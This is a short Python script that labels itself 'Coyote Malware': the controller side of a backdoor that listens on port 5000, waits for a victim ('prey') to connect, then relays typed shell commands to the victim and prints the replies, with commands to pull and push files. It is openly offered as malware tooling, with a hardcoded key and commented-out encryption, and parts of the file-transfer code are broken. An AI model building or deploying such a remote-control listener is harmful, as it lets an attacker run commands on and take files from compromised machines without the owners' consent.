#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from cryptography.fernet import Fernet as fern
from optparse import OptionParser as op
from time import sleep
from sys import argv

class Coyote:
    def __init__(self, port, key, defaulthearing=True, printing=True):
        if(printing):
            print("Starting Coyote Malware...");
        self.conn = 0;
        #self.f = fern(key);
        self.sock = socket(AF_INET, SOCK_STREAM);
        self.sock.bind(('0.0.0.0', port));
        self.sock.listen(1);
        if(defaulthearing):
            if(printing):
                print("Waiting for prey");
            self.conn, addr = self.sock.accept();
            if(printing):
                print("They prey has connected");
    def shell(self):
        cmd = "";
        while cmd != "exit":
            cmd = input(">>>");
            if(cmd[:3] == "get"):
                self.getFile(cmd[4:]);
            elif(cmd[:4] == "send"):
                self.sendFile(cmd[5:]);
            else:
                self.send(cmd);
                self.recv();
        self.conn.close();

    def send(self, msj):
        #if(type(msj) != type(b"byte")):
        #    msj = str(msj).encode();
        #msj = self.f.encrypt(msj);
        self.conn.send(msj.encode());
    def getFile(self, file):
        with open(file, "wb") as f:
            content = self.conn.recv(1024);
            f.write(content);
        print("Done!");
    def sendFile(self, file):
        try:
            with open(file,"rb") as f:
                content = f.read(1024);
        except FileNotFoundError:
            print("File not found.");
        else:
            self.send(content);
    def recv(self):
        msj = self.conn.recv(1024).decode();
        #msj = self.f.decrypt(msj).decode();
        print(msj);




def main():
    c = Coyote(5000, b"dgjVmVHUY_0GlJ2t8aHX5YfacfGkQcLlcIREQ9nPd7U=");
    c.shell();

if __name__ == '__main__':
    main()

